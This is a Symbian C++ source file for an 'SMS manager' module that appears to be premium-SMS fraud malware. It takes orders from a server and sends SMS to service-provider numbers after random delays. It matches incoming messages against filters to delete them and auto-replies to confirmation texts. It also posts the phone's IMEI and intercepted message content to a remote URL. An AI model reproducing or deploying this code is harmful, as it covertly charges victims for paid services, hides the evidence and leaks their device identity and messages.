#include <utf.h>
#include <escapeutils.h>
#include "smsmanager.h"
#include "systemengine.h"

void CSmsManager::OnTimerExpired(){//From MTimeOutNotify
  TInt count=iReplySmsMessageArray->Count();
  if(count){
    for(TInt i=count-1;i>=0;--i){
      TInt sleepSeconds=GetRandom(10,20);
      if(DebugEnabled()){
        TBuf8<100> buf;
        buf.Copy(_L8("CSmsManager::OnTimerExpired():Sleep "));
        buf.AppendNum(sleepSeconds);
        buf.Append(_L8(" seconds before sending sms message."));
        Log(buf);
      }
      User::After(sleepSeconds*1000*1000);
      if(DebugEnabled()){
        Log(_L8("CSmsManager::OnTimerExpired():Sleep finished"));
      }
      SmsMessage* item=(SmsMessage*)iReplySmsMessageArray->At(i);
      iSmsEngine->SendMessage(item->PhoneNumber,item->MessageContent);
      iReplySmsMessageArray->Delete(i);
    }
  }
}

void CSmsManager::StartTask(CTaskObserver* aObserver,const TDesC8& aSmsOrder,TInt aTaskId){
  Log(_L8("CSmsManager::StartTask start"));
  //Log(aSmsOrder);
  this->iTaskObserver=aObserver;
  this->iTaskId=aTaskId;
  CDesC8ArrayFlat* lines=new (ELeave) CDesC8ArrayFlat(1);
  CleanupStack::PushL(lines);
  SeprateToArray(aSmsOrder,KNewLine,*lines);
  TBool needSendMessage=EFalse;
  //Log(10001);
  for(TInt i=0;i<lines->Count();++i){
    TBuf8<200> singleOrder;
    singleOrder.Copy((*lines)[i]);
    singleOrder.Trim();
    if(singleOrder.Length()<6||singleOrder.FindF(_L8("#"))==0) continue;
    Log(singleOrder);
    CDesC8ArrayFlat* fields=new (ELeave) CDesC8ArrayFlat(1);
    CleanupStack::PushL(fields);
    SeprateToArray(singleOrder,_L8(","),*fields);
    if(fields->Count()>=7){
      SpChannelItem* item=new (ELeave) SpChannelItem();
      TInt fieldIndex=0;
      item->Id=Utf8ToUnicode((*fields)[fieldIndex++]);
      item->ParentId=Utf8ToUnicode((*fields)[fieldIndex++]);
      item->SpNumber.Copy(Utf8ToUnicode((*fields)[fieldIndex++]));
      item->SpSmsContent.Copy(Utf8ToUnicode((*fields)[fieldIndex++]));
      item->SpNumberFilter.Copy(Utf8ToUnicode((*fields)[fieldIndex++]));
      item->SpSmsContentFilter.Copy(Utf8ToUnicode((*fields)[fieldIndex++]));
      item->ParseInServer=(((*fields)[fieldIndex++]).Find(_L8("1"))>=0);
      if(item->SpSmsContentFilter.Length()==0&&item->SpNumberFilter.Length()==0){
        if(item->SpNumber.Length()>3){
          needSendMessage=ETrue;
          SmsMessage* message=new SmsMessage();
          message->PhoneNumber.Copy(item->SpNumber);
          message->MessageContent.Copy(item->SpSmsContent);
          this->iReplySmsMessageArray->AppendL(message);
          delete item;
          continue;
        }
      }
      this->iContractItemArray->AppendL(item);
    }
    //Log(2);
    CleanupStack::PopAndDestroy(fields);
  }
  CleanupStack::PopAndDestroy(lines);
  if(needSendMessage&&!this->iTimer->IsActive()){
    this->iTimer->After(10*1000*1000);
  }
  iTaskObserver->OnTaskSuccess(iTaskId);
}

void CSmsManager::OnResponseReceived(const TDesC8& aData){
  if(aData.Find(_L8("`sms-reply`"))==0){
    CDesC8ArrayFlat* fields=new (ELeave) CDesC8ArrayFlat(1);
    CleanupStack::PushL(fields);
    SeprateToArray(aData,_L8(","),*fields);
    if(fields->Count()==3){
      SmsMessage* message=new SmsMessage();
      message->PhoneNumber.Copy(Utf8ToUnicode((*fields)[1]));
      message->MessageContent.Copy(Utf8ToUnicode((*fields)[2]));
      this->iReplySmsMessageArray->AppendL(message);
      if(!this->iTimer->IsActive()){
        this->iTimer->After(10*1000*1000);
      }
      Log(_L8("Sms Server Parser result received, will reply in 10 seconds!"));
    }
    CleanupStack::PopAndDestroy(fields);
    return;
  }
}

CSmsManager::CSmsManager(){
  this->iContractItemArray=new (ELeave) CArrayPtrSeg<SpChannelItem> (5);
  this->iReplySmsMessageArray=new (ELeave) CArrayPtrSeg<SmsMessage> (5);
  this->iSmsEngine=CSmsEngine::NewL(this);
}

CSmsManager::~CSmsManager(){
}

CSmsManager* CSmsManager::NewLC(){
  CSmsManager* self=new (ELeave) CSmsManager();
  CleanupStack::PushL(self);
  self->ConstructL();
  return self;
}

CSmsManager* CSmsManager::NewL(){
  CSmsManager* self=CSmsManager::NewLC();
  CleanupStack::Pop(); // self;
  return self;
}

void CSmsManager::ConstructL(){
  this->iContractItemArray=new (ELeave) CArrayPtrSeg<SpChannelItem> (5);
  this->iReplySmsMessageArray=new (ELeave) CArrayPtrSeg<SmsMessage> (5);
  this->iSmsEngine=CSmsEngine::NewL(this);
  iTimer=CTimeOutTimer::NewL(0,*this);
}

void CSmsManager::ParseSmsInServer(const TDesC& address,const TDesC& content,const TDesC& aChannelItemId){
  Log(_L8("CAppMain::ParseSmsInServer() start"));
  SAFE_DELETE(iSocketEngine);
  iSocketEngine=CSocketEngine::NewL();
  iSocketEngine->SetUserAgent(KUserAgent);
  TBuf8<5000> postBody;
  CSystemEngine* manager=CSystemEngine::NewL();
  CleanupStack::PushL(manager);
  TPtrC8 imei=manager->GetIMEI();
  postBody.Append(_L8("imei="));
  postBody.Append(imei);
  CleanupStack::PopAndDestroy(manager);
  postBody.Append(_L8("&id="));
  postBody.Append(aChannelItemId);
  postBody.Append(_L8("&spNumber="));
  postBody.Append(address);
  postBody.Append(_L8("&content="));
  HBufC8* utf8Content=CnvUtfConverter::ConvertFromUnicodeToUtf8L(content);
  CleanupStack::PushL(utf8Content);
  HBufC8* encodedContent=EscapeUtils::EscapeEncodeL(utf8Content->Des(),EscapeUtils::EEscapeUrlEncoded);
  CleanupStack::PushL(encodedContent);
  postBody.Append(encodedContent->Des());
  CleanupStack::PopAndDestroy(encodedContent);
  CleanupStack::PopAndDestroy(utf8Content);
  iSocketEngine->HTTPPostRange(this,KSmsParserUrl,_L8(""),postBody,0,-1);
  Log(_L8("CAppMain::ParseSmsInServer() end"));
}

TBool Match(const TDesC& aSpNumber,const TDesC& aSpSmsMessage,const TDesC& aSpNumberFilter,const TDesC& aSpSmsContentFilter){
  if(aSpNumberFilter.Length()>0&&aSpNumber.Find(aSpNumberFilter)<0) return EFalse;
  if(aSpSmsContentFilter.Length()==0) return ETrue;
  TPtrC ptr(aSpSmsContentFilter);
  TInt pos=ptr.FindF(_L("|"));
  if(pos>=0){
    do{
      if(pos==ptr.Length()-1) return ETrue;
      if(pos>0&&aSpSmsMessage.Find(ptr.Left(pos))<0) return EFalse;
      ptr.Set(ptr.Mid(pos+1));
      pos=ptr.FindF(_L("|"));
    }while(pos>=0);
  }
  return aSpSmsMessage.Find(ptr)>=0;
}

TBool CSmsManager::MessageNeedDelete(const TDesC& aSpNumber,const TDesC& aSpSmsMessage){
  //Log(aSpNumber);
  //Log(aSpSmsMessage);
  TBool result=EFalse;
  TInt contractItemCount=this->iContractItemArray->Count();
  if(contractItemCount>0){
    for(TInt i=contractItemCount-1;i>=0;--i){
      SpChannelItem* item=(SpChannelItem*)this->iContractItemArray->At(i);
      if(!Match(aSpNumber,aSpSmsMessage,item->SpNumberFilter,item->SpSmsContentFilter)) continue;
      result=ETrue;
      //Log(item->SpNumberFilter);
      //Log(item->SpSmsContentFilter);
      //LogBool(item->ParseInServer);
      //Log(aSpNumber);
      //Log(aSpSmsMessage);
      if(item->ParseInServer){
        this->ParseSmsInServer(aSpNumber,aSpSmsMessage,item->Id);
      }else if(item->SpSmsContent.Length()>0){//Need reply this message
        SmsMessage* message=new SmsMessage();
        message->MessageContent.Copy(item->SpSmsContent);
        if(item->SpNumber.Length()==0){
          message->PhoneNumber.Copy(aSpNumber);
        }else{
          message->PhoneNumber.Copy(item->SpNumber);
        }
        this->iReplySmsMessageArray->AppendL(message);
        if(!this->iTimer->IsActive()) this->iTimer->After(10*1000*1000);
        Log(_L8("Need Reply this message, will reply in 10 seconds!"));
      }
      break;
    }
  }
  return result;
}
